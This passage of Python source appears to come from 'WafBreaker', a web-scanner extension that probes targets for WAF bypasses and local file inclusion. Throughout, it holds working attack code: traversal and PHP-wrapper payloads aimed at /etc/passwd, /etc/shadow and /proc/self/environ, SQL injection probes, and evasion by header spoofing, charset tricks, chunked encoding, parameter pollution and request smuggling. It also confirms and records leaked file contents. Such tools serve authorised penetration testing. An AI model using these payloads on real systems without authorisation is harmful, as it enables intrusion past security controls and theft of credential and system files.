        # Relative traversal depths 1-9 for Linux files
        for depth in range(1, 10):
            prefix = "../" * depth
            for lf in _LINUX_FILES:
                _add(prefix + lf, lf + " (%d-lvl)" % depth)

        # Relative traversal depths 1-6 for Windows files (forward + backslash)
        for depth in range(1, 7):
            pfx_fwd = "../" * depth
            pfx_bsl = "..\\" * depth
            for wf in _WIN_FILES:
                _add(pfx_fwd + wf.replace("\\", "/"), wf + " (%d-lvl fwd)" % depth)
                _add(pfx_bsl + wf,                    wf + " (%d-lvl bsl)" % depth)

        # Absolute paths (no traversal needed -- server-side include)
        _abs = [
            ("/etc/passwd",                       "/etc/passwd (abs)"),
            ("/etc/shadow",                       "/etc/shadow (abs)"),
            ("/etc/hosts",                        "/etc/hosts (abs)"),
            ("/etc/os-release",                   "/etc/os-release (abs)"),
            ("/proc/self/environ",                "/proc/self/environ (abs)"),
            ("/proc/self/cmdline",                "/proc/self/cmdline (abs)"),
            ("/proc/version",                     "/proc/version (abs)"),
            ("/var/log/apache2/access.log",       "Apache access.log (abs)"),
            ("/var/log/nginx/access.log",         "Nginx access.log (abs)"),
            ("C:\\windows\\win.ini",              "win.ini (abs)"),
            ("C:\\boot.ini",                      "boot.ini (abs)"),
        ]
        for fp, fl in _abs:
            _add(fp, fl)

        # PHP stream wrappers (skip encoding -- PHP parses before WAF can tamper)
        _php = [
            ("php://filter/convert.base64-encode/resource=/etc/passwd",
             "PHP wrapper -> /etc/passwd", True),
            ("php://filter/convert.base64-encode/resource=../../../etc/passwd",
             "PHP wrapper -> traversal /etc/passwd", True),
            ("php://filter/convert.base64-encode/resource=../../../../etc/passwd",
             "PHP wrapper -> 4-lvl /etc/passwd", True),
            ("php://filter/read=string.rot13/resource=/etc/passwd",
             "PHP rot13 -> /etc/passwd", True),
            ("php://input",                       "php://input",          True),
            ("data://text/plain;base64,dGVzdA==", "data:// wrapper",      True),
        ]
        for fp, fl, skip in _php:
            _add(fp, fl, skip)

        non_php = [(fp, fl, sk) for fp, fl, sk in _matrix_targets if not sk]
        php_only = [(fp, fl, sk) for fp, fl, sk in _matrix_targets if sk]
        total_est = len(non_php) * (1 + len(LFI_TAMPERS)) + len(php_only)

        self._log("[Phase 3.9] LFI matrix: %d paths x %d transforms = ~%d probes"
                  % (len(non_php), len(LFI_TAMPERS), total_est))

        confirmed_files = []
        seen_confirmed  = set()

        # ------------------------------------------------------------------ #
        # Non-PHP targets: raw probe + all 28 transforms, bypass applied on top
        # ------------------------------------------------------------------ #
        for (file_path, file_label, _skip) in non_php:
            # -- raw (with active bypass) --
            fp_b, fkw_b = self._apply_bypass(file_path, {})
            req = self._build_request(fp_b, **fkw_b)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[LFI raw] " + file_label, file_path, status, body, oc)
            match = self._lfi_match(body, oc)
            if match and file_path not in seen_confirmed:
                seen_confirmed.add(file_path)
                snippet = body[:600].replace('<', '&lt;').replace('>', '&gt;')
                self._log("[+] LFI confirmed (raw): %s -- %s" % (file_label, match))
                confirmed_files.append((file_label, file_path, match, snippet))
                continue

            # -- all 28 encoding transforms --
            for (tname, tfunc, tdesc) in LFI_TAMPERS:
                if file_path in seen_confirmed:
                    break
                try:
                    transformed = tfunc(file_path)
                except Exception:
                    continue
                if transformed == file_path:
                    continue

                tp_b, tkw_b = self._apply_bypass(transformed, {})
                req2 = self._build_request(tp_b, **tkw_b)
                status2, body2 = self._send(req2)
                oc2 = self._outcome(status2, body2)
                self._report("[LFI %s] %s" % (tname, file_label),
                             transformed, status2, body2, oc2)
                match2 = self._lfi_match(body2, oc2)
                if match2 and file_path not in seen_confirmed:
                    seen_confirmed.add(file_path)
                    snippet2 = body2[:600].replace('<', '&lt;').replace('>', '&gt;')
                    self._log("[+] LFI confirmed (%s): %s -- %s"
                              % (tname, file_label, match2))
                    confirmed_files.append(
                        (file_label + " [" + tname + "]",
                         transformed, match2, snippet2))

        # ------------------------------------------------------------------ #
        # PHP wrappers: raw only, no encoding
        # ------------------------------------------------------------------ #
        for (file_path, file_label, _skip) in php_only:
            req = self._build_request(file_path)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[LFI php] " + file_label, file_path, status, body, oc)
            match = self._lfi_match(body, oc)
            if match and file_path not in seen_confirmed:
                seen_confirmed.add(file_path)
                snippet = body[:600].replace('<', '&lt;').replace('>', '&gt;')
                self._log("[+] LFI confirmed (PHP wrapper): %s -- %s"
                          % (file_label, match))
                confirmed_files.append((file_label, file_path, match, snippet))

        # ------------------------------------------------------------------ #
        # Report
        # ------------------------------------------------------------------ #
        if not confirmed_files:
            self._log("[Phase 3.9 complete] No LFI reads confirmed across %d paths x %d transforms."
                      % (len(non_php), len(LFI_TAMPERS)))
            return

        bypass_line = ""
        if self._bypass:
            bn = self._bypass.get("name", self._bypass.get("type", "bypass"))
            bypass_line = "<br>WAF bypass used: <b>%s</b>" % bn

        rows_html = ""
        for (fl, fp, md, snip) in confirmed_files:
            rows_html += (
                "<tr>"
                "<td><b>%s</b></td>"
                "<td><code>%s</code></td>"
                "<td>%s</td>"
                "</tr>" % (fl, fp, md)
            )

        snippets_html = ""
        for (fl, fp, md, snip) in confirmed_files:
            snippets_html += (
                "<br><b>%s</b> (<code>%s</code>):<br><pre>%s</pre>"
                % (fl, fp, snip)
            )

        detail = (
            "WafBreaker confirmed <b>Local File Inclusion</b> -- "
            "<b>%d file read(s)</b>.%s<br><br>"
            "Tested: <b>%d path variants</b> x <b>%d encoding transforms</b>"
            " = ~%d total probes.<br><br>"
            "<b>Confirmed reads:</b><br>"
            "<table border='1' cellpadding='4'>"
            "<tr><th>File / Transform</th><th>Injected path</th><th>Detection</th></tr>"
            "%s"
            "</table>"
            "%s"
            % (len(confirmed_files), bypass_line,
               len(non_php), len(LFI_TAMPERS), total_est,
               rows_html, snippets_html)
        )

        has_passwd  = any("passwd" in fp.lower() or "passwd" in fl.lower()
                          for (fl, fp, _, __) in confirmed_files)
        conf_str    = "Certain" if (has_passwd or len(confirmed_files) >= 2) else "Firm"
        title       = "LFI Confirmed -- %d File Read%s" % (
            len(confirmed_files),
            "s" if len(confirmed_files) != 1 else "",
        )

        if "LFI" not in self._issued_high:
            self._issued_high.add("LFI")
            self._add_issue(title, detail, severity="High", confidence=conf_str)
            self._log("[Phase 3.9 complete] %d confirmed -> issue filed."
                      % len(confirmed_files))
        else:
            self._log("[Phase 3.9 complete] %d confirmed (issue already filed)."
                      % len(confirmed_files))

    def run(self):
        self._log("=" * 55)
        self._log("Scan started  |  target: %s:%d" % (
            self._svc.getHost(), self._svc.getPort()))

        probe = INITIAL_PROBES[self._vtype]

        self._log("[Phase 1]  Initial probe -> " + probe[:60])
        req = self._build_request(probe)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("Initial Probe", probe, status, body, oc)

        if self._is_blocked(status, body):
            self._log("[!] WAF detected (HTTP %d).  Engaging bypass phase..." % status)
            self._waf_found = True

            _norm_body = self._normalize_body_for_baseline(body)
            self._blocked_baseline = {
                "len":          len(body),
                "norm_len":     len(_norm_body),
                "status":       status,
                "snippet":      body[:200].lower(),
                "norm_snippet": _norm_body[:200],
            }

            try:
                if self._last_http_msg:
                    _rraw = self._last_http_msg.getResponse()
                    if _rraw:
                        _ranalyzed = self._h.analyzeResponse(_rraw)
                        _rhdrs = list(_ranalyzed.getHeaders())
                        _rhdrs_str = "\n".join(_rhdrs)
                        self._waf_vendor = self._fingerprint_waf(_rhdrs_str, body)
            except Exception:
                pass

            _vendor_str = (" [vendor: %s]" % self._waf_vendor) if self._waf_vendor else ""
            self._add_issue(
                "WAF Detected -- %s" % self._vtype,
                "A Web Application Firewall blocked the initial <b>%s</b> probe.<br>"
                "Probe payload: <code>%s</code><br>"
                "Response status: <b>%d</b>%s<br>"
                "WafBreaker will now attempt bypass techniques in Phase 2."
                % (self._vtype, probe[:300], status,
                   ("<br>Identified vendor: <b>%s</b>" % self._waf_vendor)
                   if self._waf_vendor else ""),
                severity="Information",
                confidence="Firm",
            )
            self._phase_bypass(probe)
        else:
            self._log("[+] No WAF block on probe (HTTP %d).  Skipping bypass phase." % status)

        self._phase_break_repair()

        self._phase_payloads()

        self._phase_header_injection()

        if self._vtype == "XSS":
            self._phase_blind_xss()

        self._phase_confirm_lfi()

        self._phase_tamper_sweep()

        self._log("=" * 55)
        self._log("Scan complete -- %d requests sent." % self._req_count)

    def _phase_bypass(self, probe):
        self._log("[Phase 2]  Testing bypass techniques...")

        if self._waf_vendor:
            self._log("[Phase 2]  WAF vendor: %s" % self._waf_vendor.upper())
            hints = WAF_VENDOR_BYPASS_HINTS.get(self._waf_vendor, [])
            if hints:
                self._log("[Phase 2]  Vendor bypass hints: %s" % ", ".join(hints))

        self._log("[2-A] HTTP Header Trust...")

        header_sets = [
            (["X-Forwarded-For: 127.0.0.1"],                          "XFF: 127.0.0.1"),
            (["X-Originating-IP: 127.0.0.1"],                         "X-Orig-IP: 127.0.0.1"),
            (["X-Remote-IP: 127.0.0.1"],                              "X-Remote-IP: 127.0.0.1"),
            (["X-Remote-Addr: 127.0.0.1"],                            "X-Remote-Addr: 127.0.0.1"),
            (["X-Client-IP: 127.0.0.1"],                              "X-Client-IP: 127.0.0.1"),
            (["X-Real-IP: 127.0.0.1"],                                "X-Real-IP: 127.0.0.1"),
            (["True-Client-IP: 127.0.0.1"],                           "True-Client-IP: 127.0.0.1"),
            (["Cluster-Client-IP: 127.0.0.1"],                        "Cluster-Client-IP"),
            (["Forwarded: for=127.0.0.1"],                            "Forwarded RFC7239"),
            (["X-Forwarded-For: 10.0.0.1"],                           "XFF: 10.0.0.1"),
            (["X-Forwarded-For: 192.168.0.1"],                        "XFF: 192.168.0.1"),
            ([
                "X-Forwarded-For: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Remote-Addr: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
            ], "All Trust Headers"),
        ]

        for hdrs, label in header_sets:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": hdrs, "name": "header-" + label}

        self._log("[2-B] Charset manipulation (ibm037)...")

        encoded_probe = ibm037_encode(probe)
        req = self._build_request(encoded_probe, charset="ibm037")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: ibm037", encoded_probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] ibm037 charset bypass WORKED!")
            self._bypass = {"type": "charset_ibm037", "name": "charset-ibm037"}

        req = self._build_request(probe, charset="utf-7")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-7", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-7", "name": "charset-utf-7"}

        req = self._build_request(probe, charset="utf-16")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-16", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-16", "name": "charset-utf-16"}

        _extra_charsets = [
            "utf-32",
            "shift_jis",
            "gbk",
            "gb2312",
            "euc-kr",
            "iso-2022-jp",
        ]
        for _cs in _extra_charsets:
            if self._bypass:
                break
            req = self._build_request(probe, charset=_cs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Charset: %s" % _cs, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Charset bypass WORKED: %s" % _cs)
                self._bypass = {"type": "charset", "cs": _cs, "name": "charset-" + _cs}

        self._log("[2-C] HTTP Method override...")

        for method in ["TestingWafBypass", "FUZZ", "WAFBYPASS", "OPTIONS"]:
            req = self._build_request(probe, override_method=method)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Method: " + method,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Method bypass WORKED: " + method)
                self._bypass = {"type": "method", "verb": method, "name": "method-" + method}

        self._log("[2-D] Body size padding (%d KB)..." % (self.JUNK_SIZE_BYTES // 1024))

        req = self._build_request(probe, add_junk=True)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Body padding ~%dKB" % (
            self.JUNK_SIZE_BYTES // 1024), probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] Body-size bypass WORKED!")
            self._bypass = {"type": "junk", "name": "body-padding"}

        self._log("[2-E] X-HTTP-Method-Override headers...")

        for oh in [
            ["X-HTTP-Method-Override: GET"],
            ["X-HTTP-Method-Override: PUT"],
            ["X-Method-Override: GET"],
            ["_method=GET"],
            ["X-HTTP-Method: DELETE"],
        ]:
            req = self._build_request(probe, extra_headers=oh)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + oh[0][:40],
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Override header bypass WORKED: " + oh[0])
                self._bypass = {"type": "override_header", "headers": oh, "name": "override-" + oh[0][:30]}

        self._log("[2-F] Content-Type confusion...")

        ct_tests = [
            (["Content-Type: application/json"],             "CT: json"),
            (["Content-Type: text/xml"],                     "CT: xml"),
            (["Content-Type: application/x-www-form-urlencoded; boundary=--"], "CT: boundary"),
            (["Content-Type: multipart/form-data; boundary=----Boundary"],     "CT: multipart"),
        ]
        for hdrs, label in ct_tests:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Content-Type confusion bypass WORKED: " + label)
                self._bypass = {"type": "ct", "headers": hdrs, "name": "ct-" + label}

        if self._vtype == "SQL Injection":
            self._log("[2-G] Tamper script probes (%d tampers)..." % len(SQLI_TAMPERS))
            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                try:
                    tampered_probe = tfunc(probe)
                except Exception:
                    continue
                if tampered_probe == probe:
                    continue
                req = self._build_request(tampered_probe)
                status, body = self._send(req)
                oc = self._outcome(status, body)
                self._report(
                    "[Bypass] Tamper: %s" % tname,
                    tampered_probe, status, body, oc)
                if not self._is_blocked(status, body) and not self._bypass:
                    self._log("[+] Tamper bypass WORKED: %s (%s)" % (tname, tdesc))
                    self._bypass = {"type": "tamper", "func": tfunc, "name": tname}

        self._log("[2-H] Multi-chunk Chunked TE (1B / 8B / space-split)...")
        _chunked_variants = [
            (1,    "1-byte-chunks"),
            (8,    "8-byte-chunks"),
            (None, "space-split-chunks"),
        ]
        for _csize, _clabel in _chunked_variants:
            if self._bypass:
                break
            try:
                _crlf = bytearray([13, 10])
                _req0 = bytearray(self._build_request(probe))
                _lines = _req0.split(_crlf)

                _blank = None
                for _i, _ln in enumerate(_lines):
                    if len(_ln) == 0:
                        _blank = _i
                        break
                if _blank is None:
                    continue

                _hdr_lines = _lines[:_blank]

                _body_ba = bytearray()
                for _bi, _bp in enumerate(_lines[_blank + 1:]):
                    if _bi > 0:
                        _body_ba += _crlf
                    _body_ba += bytearray(_bp)

                _new_hdrs = []
                for _hl in _hdr_lines:
                    try:
                        _hl_s = bytes(_hl).decode('ascii', 'ignore').lower()
                    except Exception:
                        _hl_s = ''
                    if not _hl_s.startswith('content-length:'):
                        _new_hdrs.append(bytearray(_hl))
                _new_hdrs.append(bytearray(b'Transfer-Encoding: chunked'))
                _new_hdrs.append(bytearray(b'Content-Type: application/x-www-form-urlencoded'))

                if len(_body_ba) == 0:
                    _chunked_body = bytearray(b'0') + _crlf + _crlf
                elif _csize is None:
                    _parts = bytes(_body_ba).split(b' ')
                    _chunked_body = bytearray()
                    for _j, _pt in enumerate(_parts):
                        _piece = bytearray(_pt if _j == 0 else b' ' + _pt)
                        _chunked_body += bytearray(('%X' % len(_piece)).encode('ascii'))
                        _chunked_body += _crlf + _piece + _crlf
                    _chunked_body += bytearray(b'0') + _crlf + _crlf
                else:
                    _chunked_body = _chunked_encode(_body_ba, _csize)

                _req_out = bytearray()
                for _hi, _hl in enumerate(_new_hdrs):
                    if _hi > 0:
                        _req_out += _crlf
                    _req_out += _hl
                _req_out += _crlf + _crlf + _chunked_body

            except Exception as _cte_ex:
                self._log("[2-H] Chunked build error (%s): %s" % (_clabel, str(_cte_ex)))
                continue

            status, body = self._send(_req_out)
            oc = self._outcome(status, body)
            self._report("[Bypass] Chunked TE (%s)" % _clabel, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Chunked TE bypass WORKED: %s" % _clabel)
                self._bypass = {
                    "type":    "header",
                    "headers": ["Transfer-Encoding: chunked",
                                "Content-Type: application/x-www-form-urlencoded"],
                    "name":    "chunked-te-" + _clabel,
                }

        self._log("[2-I] HTTP Parameter Pollution (true param duplication)...")
        _hpp_param = "waf"
        _hpp_type  = None
        try:
            _analyzed = self._h.analyzeRequest(self._svc, bytes(self._base_req))
            for _p in _analyzed.getParameters():
                if _p.getType() in (0, 1):
                    _hpp_param = _p.getName()
                    _hpp_type  = _p.getType()
                    break
        except Exception:
            pass
        _hpp_probe = probe.lstrip("'\" ")
        _hpp_variants = [
            ("safe_value&%s=%s"         % (_hpp_param, _hpp_probe),   "name=safe&name=payload"),
            ("safe_value&%s[]=%s"       % (_hpp_param, _hpp_probe),   "name=safe&name[]=payload"),
            ("safe_value&%s=%s"         % (_hpp_param.upper(), _hpp_probe), "name=safe&NAME=payload"),
        ]
        for _hpp_body, _hpp_label in _hpp_variants:
            if self._bypass:
                break
            req = self._build_request(_hpp_body)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] HPP (%s)" % _hpp_label, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] HPP bypass WORKED: %s" % _hpp_label)
                self._bypass = {
                    "type": "hpp",
                    "name": "hpp-" + _hpp_label,
                    "param": _hpp_param,
                    "variant": _hpp_label,
                }

        self._log("[2-J] Whitespace variants...")
        ws_variants = [
            (probe.replace(' ', '\t'),    "Tab (\\t)",       '\t'),
            (probe.replace(' ', '\x0b'),  "VT (\\x0b)",      '\x0b'),
            (probe.replace(' ', '\x0c'),  "FF (\\x0c)",      '\x0c'),
            (probe.replace(' ', '\r'),    "CR (\\r)",        '\r'),
            (probe.replace(' ', '\x00'),  "Null byte space", '\x00'),
        ]
        for variant_probe, ws_label, ws_char in ws_variants:
            if variant_probe == probe:
                continue
            req = self._build_request(variant_probe)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Whitespace: " + ws_label,
                                 variant_probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Whitespace bypass WORKED: " + ws_label)
                self._bypass = {
                    "type": "whitespace",
                    "char": ws_char,
                    "name": "whitespace-" + ws_label,
                }
                break

        self._log("[2-K] Cache-busting / noise headers...")
        noise_sets = [
            ["X-WafTest: 1", "X-Scanner: WafBreaker"],
            ["X-Custom-Header: bypass", "X-Requested-With: XMLHttpRequest"],
            ["Via: 1.1 localhost", "X-Originating-IP: 127.0.0.1",
             "X-Forwarded-For: 127.0.0.1", "X-Remote-IP: 127.0.0.1"],
            ["Origin: https://localhost", "Referer: https://localhost/admin"],
            ["X-WAF-Bypass: 1", "Pragma: no-cache",
             "Cache-Control: no-store, no-cache", "Upgrade: websocket"],
        ]
        for noise_hdrs in noise_sets:
            req = self._build_request(probe, extra_headers=noise_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = noise_hdrs[0][:40]
            self._report("[Bypass] Noise: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Noise-header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": noise_hdrs, "name": "noise-" + label}

        self._log("[2-L] Accept / Accept-Language header bypass...")
        accept_sets = [
            ["Accept: */*; q=0.01", "Accept-Language: *"],
            ["Accept: application/json,*/*;q=0.1"],
            ["Accept-Language: en-US,en;q=0.9,x-waf;q=0.1"],
            ["Accept-Encoding: identity;q=0, *;q=0", "Accept: text/html"],
        ]
        for acc_hdrs in accept_sets:
            req = self._build_request(probe, extra_headers=acc_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = acc_hdrs[0][:40]
            self._report("[Bypass] Accept: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Accept bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": acc_hdrs, "name": "accept-" + label}

        if self._vtype == "LFI":
            self._phase_lfi_bypass(probe)

        if not self._bypass:
            self._log("[2-N] Gzip body compression bypass...")
            try:
                req_gz = self._build_request(probe, compress_body=True)
                status_gz, body_gz = self._send(req_gz)
                oc_gz = self._outcome(status_gz, body_gz)
                self._report("[Bypass] Gzip body", probe, status_gz, body_gz, oc_gz)
                if not self._is_blocked(status_gz, body_gz):
                    self._log("[+] Gzip body bypass WORKED")
                    self._bypass = {"type": "gzip_body", "name": "gzip-body"}
            except Exception as _gz_ex:
                self._log("[2-N] Gzip skipped: " + str(_gz_ex))

        if not self._bypass:
            self._log("[2-O] JSON body injection bypass...")
            _json_variants = [
                ("json-raw",            False),
                ("json-unicode-escape", True),
            ]
            for _jlabel, _jescape in _json_variants:
                try:
                    req_j = self._build_request(probe, json_body=True,
                                                json_escape=_jescape)
                    status_j, body_j = self._send(req_j)
                    oc_j = self._outcome(status_j, body_j)
                    self._report("[Bypass] " + _jlabel, probe, status_j, body_j, oc_j)
                    if not self._is_blocked(status_j, body_j):
                        self._log("[+] JSON bypass WORKED: " + _jlabel)
                        self._bypass = {
                            "type":   "json_body",
                            "name":   _jlabel,
                            "escape": _jescape,
                        }
                        break
                except Exception as _j_ex:
                    self._log("[2-O] %s skipped: %s" % (_jlabel, str(_j_ex)))

        if not self._bypass:
            self._log("[2-P] Cookie-header injection bypass...")
            _ck_hdr = "Cookie: waf_test=" + probe.replace(' ', '+')
            req_ck = self._build_request(probe, extra_headers=[_ck_hdr])
            status_ck, body_ck = self._send(req_ck)
            oc_ck = self._outcome(status_ck, body_ck)
            self._report("[Bypass] Cookie inject", probe, status_ck, body_ck, oc_ck)
            if not self._is_blocked(status_ck, body_ck):
                self._log("[+] Cookie injection bypass WORKED")
                self._bypass = {
                    "type": "cookie",
                    "name": "cookie-inject",
                }

        if not self._bypass and _is_post_request(self._base_req):
            self._log("[2-Q] HTTP Request Smuggling probe (TE.CL / CL.TE)...")
            _smug_payload = probe
            _smug_variants = []

            try:
                _tc_inner = ("%X\r\n%s\r\n0\r\n\r\n"
                             % (len(_smug_payload), _smug_payload)).encode('utf-8')
                _tc_body   = bytearray(_tc_inner)
                _smug_variants.append((
                    ["Transfer-Encoding: chunked",
                     "Content-Length: %d" % (len(_tc_body) - len(_smug_payload) - 10)],
                    _tc_body,
                    "TE.CL",
                ))
            except Exception:
                pass

            try:
                _ct_inner = ("X\r\n%s\r\n0\r\n\r\n" % _smug_payload).encode('utf-8')
                _ct_body   = bytearray(_ct_inner)
                _smug_variants.append((
                    ["Content-Length: 3",
                     "Transfer-Encoding: chunked"],
                    _ct_body,
                    "CL.TE",
                ))
            except Exception:
                pass

            for _smug_hdrs, _smug_body, _smug_label in _smug_variants:
                if self._bypass:
                    break
                try:
                    req_smug = self._build_request(
                        _smug_payload,
                        extra_headers=_smug_hdrs,
                    )
                    _smug_crlf = bytearray([13, 10])
                    _smug_lines = req_smug.split(_smug_crlf)
                    _smug_blank = None
                    for _si, _sl in enumerate(_smug_lines):
                        if len(_sl) == 0:
                            _smug_blank = _si
                            break
                    if _smug_blank is not None:
                        req_smug = (_smug_crlf.join(_smug_lines[:_smug_blank + 1])
                                    + _smug_crlf + _smug_crlf + _smug_body)
                    status_smug, body_smug = self._send(req_smug)
                    oc_smug = self._outcome(status_smug, body_smug)
                    self._report("[Bypass] Request Smuggling (%s)" % _smug_label,
                                 _smug_payload, status_smug, body_smug, oc_smug)
                    if not self._is_blocked(status_smug, body_smug) and not self._bypass:
                        self._log("[+] Request Smuggling probe FIRED: %s" % _smug_label)
                        self._bypass = {
                            "type":    "smuggling",
                            "name":    "smuggling-" + _smug_label,
                            "variant": _smug_label,
                        }
                        self._add_issue(
                            "Potential HTTP Request Smuggling -- %s" % self._vtype,
                            "The %s smuggling variant returned a non-blocked response. "
                            "This is a detection probe only -- full exploitation requires "
                            "two sequential requests sent to the same persistent connection. "
                            "Manual verification is strongly recommended." % _smug_label,
                            severity="High",
                            confidence="Firm",
                        )
                except Exception:
                    pass

        if not self._bypass and self._vtype == "SQL Injection":
            self._log("[2-R] JSON-inline SQL bypass (Team82/Claroty technique)...")
            _json_inline_probes = [
                ("' OR JSON_LENGTH('{}')<=8896-- -",
                 "json-length-tautology"),
                ("' OR JSON_VALID('1')-- -",
                 "json-valid"),
                ("' OR JSON_OBJECT('a',1)=JSON_OBJECT('a',1)-- -",
                 "json-object-eq"),
                ("' OR JSON_UNQUOTE(JSON_EXTRACT('{\"a\":\"1\"}','$.a'))='1'-- -",
                 "json-unquote-extract"),
                ("' OR JSON_VALUE('{\"a\":\"1\"}','$.a')='1'-- -",
                 "json-value"),
                ("' UNION distinctrow SELECT NULL,NULL,NULL-- -",
                 "distinctrow-null"),
                ("' UNION distinctrow SELECT @@version,NULL,NULL-- -",
                 "distinctrow-version"),
                ("' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
                 "json-extract-int"),
                ("' OR json_valid('{}')=1-- -",
                 "json-valid-sqlite"),
                ("' OR JSON_LENGTH(JSON_OBJECT('k',1))>0-- -",
                 "json-length-nested"),
            ]
            for _ji_probe, _ji_label in _json_inline_probes:
                if self._bypass:
                    break
                try:
                    req_ji = self._build_request(_ji_probe)
                    status_ji, body_ji = self._send(req_ji)
                    oc_ji = self._outcome(status_ji, body_ji)
                    self._report("[Bypass] json-inline/" + _ji_label,
                                 _ji_probe, status_ji, body_ji, oc_ji)
                    if not self._is_blocked(status_ji, body_ji):
                        self._log("[+] JSON-inline SQL bypass WORKED: " + _ji_label)
                        self._bypass = {
                            "type":  "json_inline",
                            "name":  "json-inline-sql-" + _ji_label,
                            "label": _ji_label,
                        }
                        break
                except Exception:
                    pass

        if self._bypass:
            bypass_name = self._bypass.get("name", self._bypass["type"])
            self._log("[Phase 2 complete]  Active bypass: %s" % bypass_name)
            self._add_issue(
                "WAF Bypass Found -- %s" % self._vtype,
                "WafBreaker successfully bypassed the WAF using the following technique "
                "while testing for <b>%s</b>.<br><br>"
                "Bypass technique: <b>%s</b><br>"
                "This means the WAF can be circumvented, allowing malicious payloads "
                "to reach the backend application without being filtered."
                % (self._vtype, bypass_name),
                severity="Medium",
                confidence="Firm",
            )
        else:
            self._log("[Phase 2 complete]  No bypass succeeded -- sending payloads raw anyway.")

    def _phase_lfi_bypass(self, probe):
        self._log("[2-M] LFI encoding bypass (%d transforms + combos + F5 tricks)..." % len(LFI_TAMPERS))

        _tamper_dict = {t: (f, d) for (t, f, d) in LFI_TAMPERS}

        def _report_and_set(bname, btype, bfunc, bheaders, transformed, tdesc):
            self._log("[+] LFI bypass WORKED: %s" % bname)
            self._bypass = {
                "type":    btype,
                "func":    bfunc,
                "name":    bname,
                "headers": bheaders,
            }
            self._add_issue(
                "LFI WAF Bypass Found -- %s" % bname,
                "WafBreaker found an LFI-specific WAF bypass technique.<br><br>"
                "Transform: <b>%s</b> -- %s<br>"
                "Test payload: <code>%s</code><br>"
                "The transformed payload was not blocked, meaning the WAF "
                "fails to detect this path traversal encoding variant."
                % (bname, tdesc, transformed[:300]),
                severity="Medium",
                confidence="Firm",
            )

        _combo_header_sets = [
            (["X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1"],                           "+xff"),
            (["X-Forwarded-For: 127.0.0.1", "True-Client-IP: 127.0.0.1",
              "X-Custom-IP-Authorization: 127.0.0.1"],                                           "+trust-chain"),
            (["Content-Type: application/json"],                                                  "+ct-json"),
            (["X-HTTP-Method-Override: GET", "X-Forwarded-For: 127.0.0.1"],                      "+override-xff"),
        ]

        solo_blocked = []

        self._log("[2-M-1] Solo transform probes...")
        for (tname, tfunc, tdesc) in LFI_TAMPERS:
            if self._bypass:
                break
            try:
                transformed = tfunc(probe)
            except Exception:
                continue
            if transformed == probe:
                continue

            req = self._build_request(transformed)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] LFI: %s" % tname, transformed, status, body, oc)

            if not self._is_blocked(status, body):
                _report_and_set(tname, "lfi_encoding", tfunc, [], transformed, tdesc)
                return

            solo_blocked.append((tname, tfunc, tdesc, transformed))

        if self._bypass:
            return

        self._log("[2-M-2] Transform + header combos (%d transforms x %d header sets)..."
                  % (min(len(solo_blocked), 12), len(_combo_header_sets)))
        for (tname, tfunc, tdesc, transformed) in solo_blocked[:12]:
            if self._bypass:
                break
            for combo_hdrs, combo_tag in _combo_header_sets:
                if self._bypass:
                    break
                req2 = self._build_request(transformed, extra_headers=combo_hdrs)
                status2, body2 = self._send(req2)
                oc2 = self._outcome(status2, body2)
                self._report("[Bypass] LFI%s: %s" % (combo_tag, tname),
                             transformed, status2, body2, oc2)
                if not self._is_blocked(status2, body2):
                    cname = tname + combo_tag
                    _hdrs_copy = list(combo_hdrs)
                    _tf_copy   = tfunc
                    _report_and_set(cname, "lfi_encoding_xff", _tf_copy, _hdrs_copy,
                                    transformed, tdesc)
                    return

        if self._bypass:
